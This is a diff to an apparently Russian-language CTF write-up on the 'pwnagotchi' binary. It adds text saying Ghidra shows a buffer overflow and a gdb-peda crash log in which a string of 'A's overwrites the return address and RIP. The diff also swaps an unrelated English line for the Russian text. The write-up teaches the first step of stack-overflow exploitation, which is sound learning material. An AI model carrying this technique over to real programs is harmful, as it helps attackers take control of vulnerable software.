@@ -43,7 +43,54 @@
 ### Декомпилирование с Ghidra
 ![](decompile_main.png)
 
-> I get one of these a week (_groan_).  I'm only writing this one up because there's a _gotcha_.
+Можно заметить, что программа уязвима к переполнению буфера, строки 6 и 18 это подтверждают. Попробуем перезаписать адрес возврата для функции main, открываем gdb.
+```
+    gdb-peda$ r
+    Starting program: /home/white/Desktop/pwnagotchi 
+    Enter your pwnagotchi's name: 
+    AAAAAAAAAAAAAAAAAAAAAAAAAA
+
+    \ (•-•) /
+
+    AAAAAAAAAAAAAAAAAAAAAAAAAA is not happy!
+
+    Program received signal SIGSEGV, Segmentation fault.
+    [----------------------------------registers-----------------------------------]
+    RAX: 0x0 
+    RBX: 0x0 
+    RCX: 0x0 
+    RDX: 0x0 
+    RSI: 0x7fffffffb9a0 ('A' <repeats 26 times>, " is not happy!\n")
+    RDI: 0x7ffff7fa44c0 --> 0x0 
+    RBP: 0x4141414141414141 ('AAAAAAAA')
+    RSP: 0x7fffffffe050 --> 0x0 
+    RIP: 0x414141414141 ('AAAAAA')
+    R8 : 0xffffffff 
+    R9 : 0x29 (')')
+    R10: 0x7fffffffe034 ('A' <repeats 26 times>)
+    R11: 0x246 
+    R12: 0x400700 (<_start>:	xor    ebp,ebp)
+    R13: 0x7fffffffe120 --> 0x1 
+    R14: 0x0 
+    R15: 0x0
+    EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+    [-------------------------------------code-------------------------------------]
+    Invalid $PC address: 0x414141414141
+    [------------------------------------stack-------------------------------------]
+    0000| 0x7fffffffe050 --> 0x0 
+    0008| 0x7fffffffe058 --> 0x7fffffffe128 --> 0x7fffffffe426 ("/home/white/Desktop/pwnagotchi")
+    0016| 0x7fffffffe060 --> 0x100040000 
+    0024| 0x7fffffffe068 --> 0x400846 (<main>:	push   rbp)
+    0032| 0x7fffffffe070 --> 0x0 
+    0040| 0x7fffffffe078 --> 0x6dd3503f33091595 
+    0048| 0x7fffffffe080 --> 0x400700 (<_start>:	xor    ebp,ebp)
+    0056| 0x7fffffffe088 --> 0x7fffffffe120 --> 0x1 
+    [------------------------------------------------------------------------------]
+    Legend: code, data, rodata, value
+    Stopped reason: SIGSEGV
+  **0x0000414141414141 in ?? ()**
+
+```
 
 
 
